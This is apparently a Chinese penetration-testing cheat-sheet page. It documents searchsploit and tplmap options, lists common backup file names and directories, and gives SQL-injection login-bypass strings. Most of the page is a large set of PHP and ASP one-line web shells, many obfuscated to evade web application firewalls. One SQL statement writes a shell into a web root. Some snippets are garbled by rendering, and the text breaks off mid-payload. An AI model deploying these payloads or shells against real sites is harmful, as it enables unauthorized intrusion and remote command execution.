<h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><p>-c, –case[Term]执行区分大小写的搜索，缺省是对大小写不敏感。<br>-e, –exact [Term]对exploit标题执行EXACT匹配（默认为AND）<br>-h, –help在屏幕上显示帮助<br>-j, –json[Term]以JSON格式显示结果<br>-m, –mirror [EDB-ID]将一个漏洞利用镜像（副本）到当前工作目录，后面跟漏洞ID号<br>-o, –overflow [Term]Exploit标题被允许溢出其列<br>-p, –path[EDB-ID]显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号<br>-t, –title[Term]仅仅搜索漏洞标题（默认是标题和文件的路径）<br>-u, –update检查并安装任何exploitdb软件包更新（deb或git）<br>-w, –www [Term]显示<a target="_blank" rel="noopener" href="http://exploit-db.com的url而不是本地路径(在线搜索)/">http://Exploit-DB.com的URL而不是本地路径（在线搜索）</a><br>-x, –examine[EDB-ID]使用$ PAGER检查（副本）漏洞利用<br>-v –verbose 显示更多的输出信息<br>–colour在搜索结果中禁用颜色突出显示.<br>–id显示EDB-ID值而不是本地路径<br>–nmap[file.xml]使用服务版本检查Nmap XML输出中的所有结果（例如：nmap -sV -oX file.xml）<br>使用实例</p>
<h3 id="漏洞更新"><a href="#漏洞更新" class="headerlink" title="漏洞更新"></a>漏洞更新</h3><p>searchsploit -u</p>
<h3 id="基本搜索"><a href="#基本搜索" class="headerlink" title="基本搜索"></a>基本搜索</h3><p>基本搜索会同时匹配标题和路径中的内容<br>如:searchsploit smb windows remote</p>
<h3 id="标题搜索"><a href="#标题搜索" class="headerlink" title="标题搜索"></a>标题搜索</h3><p>标题搜索只匹配标题,不会对路径中的关键词进行匹配<br>如:searchsploit -t smb windows remote</p>
<h3 id="联网搜索"><a href="#联网搜索" class="headerlink" title="联网搜索"></a>联网搜索</h3><p>searchsploit EternalBlue</p>
<h3 id="复制到文件夹"><a href="#复制到文件夹" class="headerlink" title="复制到文件夹"></a>复制到文件夹</h3><p>不建议在本地的漏洞数据库中修改exp,建议使用-m参数复制那些有用的到当前的工作目录<br>如:searchsploit -m 42031.py</p>
<h3 id="复制到剪贴板"><a href="#复制到剪贴板" class="headerlink" title="复制到剪贴板"></a>复制到剪贴板</h3><p>-p参数可以获取更多关于该漏洞的信息,以及将完整的路径复制到剪贴板上(如果可能的话)<br>如:searchsploit -p 42031.py</p>
<h3 id="删除不想要的结果"><a href="#删除不想要的结果" class="headerlink" title="删除不想要的结果"></a>删除不想要的结果</h3><p>使用–exclude&#x3D;选项删除不想要的结果<br>如:searchsploit smb windows remote –exclude&#x3D;”(POC)|txt”<br>利用管道输出(删除不想要的结果的另一种方法)<br>如:searchsploit smb windows remote | grep rb 只显示rb文件</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>查询关键字使用的是AND运输，关键字越多，过滤的也就越多，结果也就越准确；使用名称搜索最好是使用全称；如果要搜索微软的漏洞，可以直接使用searchsploit 搜索微软漏洞名称或者漏洞的编号和名字。</p>
<h2 id="tplmap"><a href="#tplmap" class="headerlink" title="tplmap"></a>tplmap</h2><p>基于python2<br>Usage: python tplmap.py [options]</p>
<h3 id="选项-1"><a href="#选项-1" class="headerlink" title="选项:"></a>选项:</h3><p>  -h, –help          显示帮助并退出</p>
<h3 id="目标"><a href="#目标" class="headerlink" title="目标:"></a>目标:</h3><p>  -u URL, –url&#x3D;URL   目标 URL<br>  -X REQUEST, –re..  强制使用给定的HTTP方法 (e.g. PUT)</p>
<h3 id="请求"><a href="#请求" class="headerlink" title="请求:"></a>请求:</h3><p>  -d DATA, –data&#x3D;..  通过POST发送的数据字符串 它必须作为查询字符串: param1&#x3D;value1&amp;param2&#x3D;value2<br>  -H HEADERS, –he..  附加标头 (e.g. ‘Header1: Value1’) 多次使用以添加新的标头<br>  -c COOKIES, –co..  Cookies (e.g. ‘Field1&#x3D;Value1’) 多次使用以添加新的Cookie<br>  -A USER_AGENT, -..  HTTP User-Agent 标头的值<br>  –proxy&#x3D;PROXY       使用代理连接到目标URL</p>
<h3 id="检测"><a href="#检测" class="headerlink" title="检测:"></a>检测:</h3><p>  –level&#x3D;LEVEL       要执行的代码上下文转义级别 (1-5, Default: 1)<br>  -e ENGINE, –eng..  强制将后端模板引擎设置为此值<br>  -t TECHNIQUE, –..  技术 R:渲染 T:基于时间的盲注 Default: RT</p>
<h3 id="操作系统访问"><a href="#操作系统访问" class="headerlink" title="操作系统访问:"></a>操作系统访问:</h3><p>  –os-cmd&#x3D;OS_CMD     执行操作系统命令<br>  –os-shell          提示交互式操作系统Shell<br>  –upload&#x3D;UPLOAD     上传本地文件到远程主机<br>  –force-overwrite   上传时强制覆盖文件<br>  –download&#x3D;DOWNL..  下载远程文件到本地主机<br>  –bind-shell&#x3D;BIN..  在目标的TCP端口上生成系统Shell并连接到它<br>  –reverse-shell&#x3D;..  运行系统Shell并反向连接到本地主机端口</p>
<h3 id="模板检查"><a href="#模板检查" class="headerlink" title="模板检查:"></a>模板检查:</h3><p>  –tpl-shell         在模板引擎上提示交互式Shell<br>  –tpl-code&#x3D;TPL_C..  在模板引擎中注入代码</p>
<h3 id="常规"><a href="#常规" class="headerlink" title="常规:"></a>常规:</h3><p>  –force-level&#x3D;FO..  强制将测试级别设置为此值<br>  –injection-tag&#x3D;..  使用字符串作为注入标签 (default ‘*’)</p>
<hr>
<h1 id="常见备份文件"><a href="#常见备份文件" class="headerlink" title="常见备份文件"></a>常见备份文件</h1><p>备份文件常见的后缀名<br>备份文件基本上都是压缩包<br><a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a><br>.rar<br>.zip<br>.7z<br>.tar.gz<br>.bak<br>对于bak类的备份文件，可以直接输入文件名称+.bak访问例如：<br>index.php.bak<br>.txt<br>.old<br>.temp<br>_index.html<br>.swp<br>.sql<br>.tgz<br>tar<br>备份文件常见的文件名<br>文件名不包含后缀<br>web<br>website<br>backup<br>back<br>www<br>wwwroot<br>temp<br>db<br>data<br>code<br>test<br>admin<br>user<br>sql<br>常见的备份文件所在目录<br>&#x2F; #根目录首先<br>&#x2F;admin<br>&#x2F;data<br>&#x2F;default<br>&#x2F;index<br>&#x2F;login<br>&#x2F;manage<br>&#x2F;cmseditor<br>&#x2F;db<br>&#x2F;bbs<br>&#x2F;phpadmin </p>
<hr>
<h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><p>‘ or 1&#x3D;’1<br>‘or’&#x3D;’or’<br>admin<br>admin’–<br>admin’ or 4&#x3D;4–<br>admin’ or ‘1’&#x3D;’1’–<br>admin888<br>“or “a”&#x3D;”a<br>admin’ or 2&#x3D;2#<br>a’ having 1&#x3D;1#<br>a’ having 1&#x3D;1–<br>admin’ or ‘2’&#x3D;’2<br>‘)or(‘a’&#x3D;’a<br>or 4&#x3D;4–<br>c<br>a’or’ 4&#x3D;4–<br>“or 4&#x3D;4–<br>‘or’a’&#x3D;’a<br>“or”&#x3D;”a’&#x3D;’a<br>‘or’’&#x3D;’<br>‘or’&#x3D;’or’<br>1 or ‘1’&#x3D;’1’&#x3D;1<br>1 or ‘1’&#x3D;’1’ or 4&#x3D;4<br>‘OR 4&#x3D;4%00<br>“or 4&#x3D;4%00<br>‘xor<br>admin’ UNION Select 1,1,1 FROM admin Where ‘’&#x3D;’<br>1<br>-1%cf’ union select 1,1,1 as password,1,1,1 %23<br>1<br>17..admin’ or ‘a’&#x3D;’a 密码随便<br>‘or’&#x3D;’or’<br>‘or 4&#x3D;4&#x2F;*<br>something<br>‘ OR ‘1’&#x3D;’1<br>1’or’1’&#x3D;’1<br>admin’ OR 4&#x3D;4&#x2F;*<br>1’or’1’&#x3D;’1<br>asp aspx万能密码<br>1：”or “a”&#x3D;”a<br>2： ‘)or(‘a’&#x3D;’a<br>3：or 1&#x3D;1–<br>4：’or 1&#x3D;1–<br>5：a’or’ 1&#x3D;1–<br>6：”or 1&#x3D;1–<br>7：’or’a’&#x3D;’a<br>8：”or”&#x3D;”a’&#x3D;’a<br>9：’or”&#x3D;’<br>10：’or’&#x3D;’or’<br>11: 1 or ‘1’&#x3D;’1’&#x3D;1<br>12: 1 or ‘1’&#x3D;’1’ or 1&#x3D;1<br>13: ‘OR 1&#x3D;1%00<br>14: “or 1&#x3D;1%00<br>15: ‘xor<br>16: 用户名 ’ UNION Select 1,1,1 FROM admin Where ”&#x3D;’ （替换表名admin）<br>密码 1<br>17…admin’ or ‘a’&#x3D;’a 密码随便<br>PHP万能密码<br>‘or 1&#x3D;1&#x2F;*<br>User: something<br>Pass: ’ OR ‘1’&#x3D;’1<br>jsp 万能密码<br>1’or’1’&#x3D;’1<br>admin’ OR 1&#x3D;1&#x2F;* </p>
<hr>
<h1 id="一句话大全"><a href="#一句话大全" class="headerlink" title="一句话大全"></a>一句话大全</h1><p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44632668/article/details/97818432">https://blog.csdn.net/qq_44632668/article/details/97818432</a></p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?</span> @<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cc"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span>      

//可执行命令一句话
普通一句话

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cc123<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token delimiter important">?></span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc123'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>

PHP系列

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"axsxxsxexrxxt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xindong"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$lang</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$lang</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xindong'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token string double-quoted-string">"ass"</span><span class="token operator">.</span><span class="token string double-quoted-string">"ert"</span><span class="token punctuation">;</span> <span class="token variable">$k</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"_PO"</span><span class="token operator">.</span><span class="token string double-quoted-string">"ST"</span><span class="token punctuation">&#125;</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'xindong'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"s"</span><span class="token operator">.</span><span class="token string double-quoted-string">"s"</span><span class="token operator">.</span><span class="token string double-quoted-string">"e"</span><span class="token operator">.</span><span class="token string double-quoted-string">"r"</span><span class="token operator">.</span><span class="token string double-quoted-string">"t"</span><span class="token punctuation">;</span>  <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xindong"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>                  
@<span class="token variable">$_</span><span class="token operator">=</span><span class="token string double-quoted-string">"s"</span><span class="token operator">.</span><span class="token string double-quoted-string">"s"</span><span class="token operator">.</span><span class="token comment">/*-/*-*/</span><span class="token string double-quoted-string">"e"</span><span class="token operator">.</span><span class="token comment">/*-/*-*/</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">;</span>                  
@<span class="token variable">$_</span><span class="token operator">=</span><span class="token comment">/*-/*-*/</span><span class="token string double-quoted-string">"a"</span><span class="token operator">.</span><span class="token comment">/*-/*-*/</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token comment">/*-/*-*/</span><span class="token string double-quoted-string">"t"</span><span class="token punctuation">;</span>                  
@<span class="token variable">$_</span><span class="token comment">/*-/*-*/</span><span class="token punctuation">(</span>$<span class="token comment">/*-/*-*/</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"_P"</span><span class="token operator">.</span><span class="token comment">/*-/*-*/</span><span class="token string double-quoted-string">"OS"</span><span class="token operator">.</span><span class="token comment">/*-/*-*/</span><span class="token string double-quoted-string">"T"</span><span class="token punctuation">&#125;</span>                  
<span class="token punctuation">[</span><span class="token comment">/*-/*-*/</span><span class="token number">0</span><span class="token comment">/*-/*-*/</span><span class="token operator">-</span><span class="token comment">/*-/*-*/</span><span class="token number">2</span><span class="token comment">/*-/*-*/</span><span class="token operator">-</span><span class="token comment">/*-/*-*/</span><span class="token number">5</span><span class="token comment">/*-/*-*/</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>    密码是  -7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">过狗一句话

select '<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>' into outfile 'C:/Inetpub/wwwroot/mysql-php/1.php'

    1

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$_</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span> <span class="token variable">$_</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token variable">$_</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span> <span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token string double-quoted-string">""</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//A $____=$___; $____++;//B $_____=$____; $_____++;//C $______=$_____; $______++;//D $_______=$______; $_______++;//E $________=$_______; $________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;//O $_________=$________; $_________++;$_________++;$_________++;$_________++;//S $_=$____.$___.$_________.$_______.'6'.'4'.'_'.$______.$_______.$_____.$________.$______.$_______; $________++;$________++;$________++;//R $_____=$_________; $_____++;//T $__=$___.$_________.$_________.$_______.$________.$_____; $__($_("ZXZhbCgkX1BPU1RbMV0p")); </span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$t</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'t'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$tt</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$s</span><span class="token operator">=</span>
t<span class="token punctuation">;</span><span class="token variable">$s</span><span class="token punctuation">(</span><span class="token variable">$REQUEST</span><span class="token punctuation">[</span>′cc123′<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token class-name type-declaration">php</span><span class="token variable">$t</span><span class="token operator">=</span><span class="token variable">$GET</span><span class="token punctuation">[</span>′t′<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//t=tt$tt=$GET[′tt′];//tt=as$ttt=$GET[′ttt′];//ttt=sert$s=</span>
t<span class="token operator">.</span><span class="token variable">$ttt</span><span class="token punctuation">;</span> <span class="token variable">$s</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$t</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'t'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//t=tt $tt=$_GET['tt']; //tt=as $ttt=$_GET['ttt']; //ttt=s $tttt=$_GET['tttt']; //ttt=ert $s=</span>
t<span class="token operator">.</span><span class="token variable">$ttt</span><span class="token operator">.</span><span class="token variable">$tttt</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token punctuation">(</span><span class="token variable">$REQUEST</span><span class="token punctuation">[</span>′cc′<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token class-name type-declaration">php</span><span class="token variable">$t</span><span class="token operator">=</span><span class="token variable">$GET</span><span class="token punctuation">[</span>′t′<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//t=tt$tt=$GET[′tt′];//tt=as$ttt=$GET[′ttt′];//ttt=tttt$tttt=$GET[′tttt′];//ttt=sert$s=</span>
t<span class="token operator">.</span>
ttt<span class="token punctuation">;</span><span class="token variable">$s</span><span class="token punctuation">(</span><span class="token variable">$REQUEST</span><span class="token punctuation">[</span>′cc′<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token class-name type-declaration">php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$REQUEST</span><span class="token punctuation">[</span>′a′<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//a=b;$b=$REQUEST[′b′];//b=as;$c=$REQUEST[′c′];//c=sert;$d=$REQUEST[′d′];//d=c;$e=</span>
a<span class="token operator">.</span>
d<span class="token punctuation">;</span><span class="token variable">$e</span><span class="token punctuation">(</span><span class="token variable">$REQUEST</span><span class="token punctuation">[</span>′cc′<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token class-name type-declaration">php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$REQUEST</span><span class="token punctuation">[</span>′a′<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//a=assert;$b=$REQUEST[′b′];//b=a;$d=</span>
b<span class="token punctuation">;</span> <span class="token variable">$d</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">PHP过狗
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"base64_decode"</span><span class="token punctuation">;</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>z0<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> 密码：x

&lt;%a=request(“gold”)%>&lt;%eval a%>

fuck<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">eval</span>
<span class="token punctuation">(</span><span class="token variable">$_POST</span>
<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">96</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">114</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">114</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">113</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">94</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">79</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">78</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">82</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">83</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">51</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> 密码 4

该日志目录不存在或权限不足，请检查设置！<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">eval</span>
<span class="token punctuation">(</span><span class="token variable">$_POST</span>
<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">几个变性的php–过防火墙

过狗效果都不错：
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"axsxxsxexrxxt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"sz"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$lang</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$lang</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sz'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token string double-quoted-string">"ass"</span><span class="token operator">.</span><span class="token string double-quoted-string">"ert"</span><span class="token punctuation">;</span> <span class="token variable">$k</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"_PO"</span><span class="token operator">.</span><span class="token string double-quoted-string">"ST"</span><span class="token punctuation">&#125;</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'sz'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"s"</span><span class="token operator">.</span><span class="token string double-quoted-string">"s"</span><span class="token operator">.</span><span class="token string double-quoted-string">"e"</span><span class="token operator">.</span><span class="token string double-quoted-string">"r"</span><span class="token operator">.</span><span class="token string double-quoted-string">"t"</span><span class="token punctuation">;</span> <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"sz"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">这个是90发的<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

@<span class="token variable">$_</span><span class="token operator">=</span>“s”<span class="token operator">.</span>“s”<span class="token operator">.</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span>“e”<span class="token operator">.</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span>“r”<span class="token punctuation">;</span>

